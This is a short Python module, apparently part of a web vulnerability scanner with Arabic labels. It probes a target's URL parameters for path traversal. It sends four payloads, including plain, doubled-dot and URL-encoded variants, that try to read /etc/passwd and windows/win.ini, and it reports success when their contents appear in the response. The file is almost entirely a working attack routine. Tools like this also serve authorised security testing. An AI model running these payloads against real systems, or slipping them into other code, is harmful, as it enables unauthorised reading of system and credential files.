# path-traversal.py — اجتياز المسار
import urllib.parse
from core.registry import module
from core.helpers import norm_target, get_params
from core.http import get
from core.wordlists import COMMON_PARAMS

@module("path-traversal", "web", "اجتياز المسار")
def run(turl, a, R):
    base = norm_target(turl)
    for p in get_params(turl) or COMMON_PARAMS:
        for pay in ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini",
                    "....//....//....//etc/passwd", "..%2f..%2f..%2fetc/passwd"]:
            st, _, b = get(f"{base}/?{p}={urllib.parse.quote(pay)}")
            if "root:" in b and "/bin/" in b:
                R.vuln(f"Path Traversal في {p}: /etc/passwd! ({pay})")
            elif "[extensions]" in b or "for 16-bit app support" in b:
                R.vuln(f"Path Traversal في {p}: win.ini مقروء! ({pay})")
    R.info("اكتمل فحص اجتياز المسار")
